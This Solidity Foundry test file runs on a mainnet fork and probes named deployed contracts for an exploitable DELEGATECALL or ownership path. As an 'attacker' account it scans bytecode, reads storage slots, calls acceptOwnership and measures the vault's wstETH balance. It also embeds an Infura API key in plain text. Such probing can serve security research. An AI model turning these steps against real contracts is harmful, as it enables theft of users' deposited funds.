// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract DelegatecallExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeDelegatecallAt1045() public view {
        console.log("=== ANALYZING DELEGATECALL AT 1045 (R1) ===\n");

        bytes memory code = REDEMPTION_1.code;

        // DELEGATECALL at 1045 loads from slot 1 (pendingOwner)
        // But we need to understand the full context

        console.log("Opcodes around offset 1000-1100:");
        uint i = 1000;
        while (i < 1100 && i < code.length) {
            uint8 op = uint8(code[i]);
            uint skipBytes = 0;

            if (op == 0x54) console.log(i, "SLOAD");
            if (op == 0x55) console.log(i, "SSTORE");
            if (op == 0xf1) console.log(i, "CALL");
            if (op == 0xf4) console.log(i, "DELEGATECALL");
            if (op == 0x33) console.log(i, "CALLER");
            if (op == 0x14) console.log(i, "EQ");
            if (op == 0x57) console.log(i, "JUMPI");
            if (op == 0x5b) console.log(i, "JUMPDEST");

            if (op >= 0x60 && op <= 0x65) {
                uint8 size = op - 0x5f;
                uint256 val = 0;
                for (uint j = 0; j < size && i + 1 + j < code.length; j++) {
                    val = val << 8 | uint8(code[i + 1 + j]);
                }
                if (val < 100) console.log(i, "PUSH:", val);
                skipBytes = size;
            }

            if (op == 0x63) {
                bytes4 sel = bytes4(bytes.concat(
                    code[i+1], code[i+2], code[i+3], code[i+4]
                ));
                if (sel != bytes4(0) && uint32(sel) > 0x1000) {
                    console.log(i, "PUSH4:");
                    console.logBytes4(sel);
                }
                skipBytes = 4;
            }

            i += 1 + skipBytes;
        }

        // Check what's in slot 1 (pendingOwner)
        bytes32 slot1 = vm.load(REDEMPTION_1, bytes32(uint256(1)));
        console.log("\nR1 slot 1 (pendingOwner):");
        console.logBytes32(slot1);
    }

    function test_FindDelegatecallTrigger() public view {
        console.log("=== FINDING DELEGATECALL TRIGGER ===\n");

        bytes memory code = REDEMPTION_1.code;

        // Find which function selector leads to DELEGATECALL at 1045
        // by looking for JUMPI patterns before it

        console.log("Looking for function dispatch before 1045:");

        for (uint i = 0; i < 1000 && i < code.length; i++) {
            if (uint8(code[i]) == 0x63) { // PUSH4
                bytes4 sel = bytes4(bytes.concat(
                    code[i+1], code[i+2], code[i+3], code[i+4]
                ));

                // Check if followed by EQ and JUMPI
                bool isDispatch = false;
                uint jumpTarget = 0;
                for (uint j = i + 5; j < i + 20 && j < code.length; j++) {
                    if (uint8(code[j]) == 0x14) { // EQ
                        for (uint k = j; k < j + 10 && k < code.length; k++) {
                            if (uint8(code[k]) == 0x57) { // JUMPI
                                // Get target
                                if (k >= 3 && uint8(code[k-3]) == 0x61) { // PUSH2
                                    jumpTarget = uint8(code[k-2]) << 8 | uint8(code[k-1]);
                                    isDispatch = true;
                                }
                                break;
                            }
                        }
                        break;
                    }
                }

                if (isDispatch && jumpTarget > 950 && jumpTarget < 1100) {
                    console.log("Selector leads to area around 1045:");
                    console.logBytes4(sel);
                    console.log("  Jump target:", jumpTarget);
                }
            }
        }
    }

    function test_TryKnownDelegatecallSelectors() public {
        console.log("=== TRYING KNOWN DELEGATECALL-RELATED SELECTORS ===\n");

        vm.startPrank(attacker);

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        // Try selectors that might trigger delegatecall
        // 0x79ba5097 = acceptOwnership() - this uses pendingOwner

        console.log("Trying acceptOwnership:");
        (bool s1, bytes memory d1) = REDEMPTION_1.call(
            abi.encodeWithSignature("acceptOwnership()")
        );
        console.log("acceptOwnership:", s1);
        if (!s1 && d1.length >= 4) console.logBytes4(bytes4(d1));

        // Check if there's something that can set pendingOwner without owner access
        // Or if we can call through implementation directly

        console.log("\nTrying implementation calls:");
        address impl = address(uint160(uint256(vm.load(REDEMPTION_1, bytes32(uint256(5))))));
        console.log("Implementation:", impl);

        (bool s2, bytes memory d2) = impl.call(
            abi.encodeWithSignature("acceptOwnership()")
        );
        console.log("impl.acceptOwnership:", s2);

        vm.stopPrank();

        console.log("\nVault change:", int256(IERC20(wstETH).balanceOf(VAULT)) - int256(vaultBefore));
    }

    function test_CheckDelegatecallWithUserInput() public view {
        console.log("=== CHECKING IF DELEGATECALL USES USER INPUT ===\n");

        // The CREATE2 at 4338 uses CALLER as part of salt
        // Is there a DELEGATECALL that uses user-controlled data?

        bytes memory code = REDEMPTION_1.code;

        // DELEGATECALL locations in R1: let's find them
        console.log("All DELEGATECALL locations:");
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) {
                console.log("DELEGATECALL at:", i);

                // Look for SLOAD or CALLDATALOAD before
                for (uint j = (i > 50 ? i - 50 : 0); j < i; j++) {
                    if (uint8(code[j]) == 0x54) {
                        console.log("  SLOAD at:", j);
                        // Find what slot
                        for (uint k = (j > 10 ? j - 10 : 0); k < j; k++) {
                            if (uint8(code[k]) >= 0x60 && uint8(code[k]) <= 0x65) {
                                uint8 size = uint8(code[k]) - 0x5f;
                                uint256 val = 0;
                                for (uint m = 0; m < size; m++) {
                                    val = val << 8 | uint8(code[k + 1 + m]);
                                }
                                if (val < 20) {
                                    console.log("    Slot:", val);
                                }
                            }
                        }
                    }
                    if (uint8(code[j]) == 0x35) {
                        console.log("  CALLDATALOAD at:", j, "(USER INPUT!)");
                    }
                }
            }
        }
    }
}
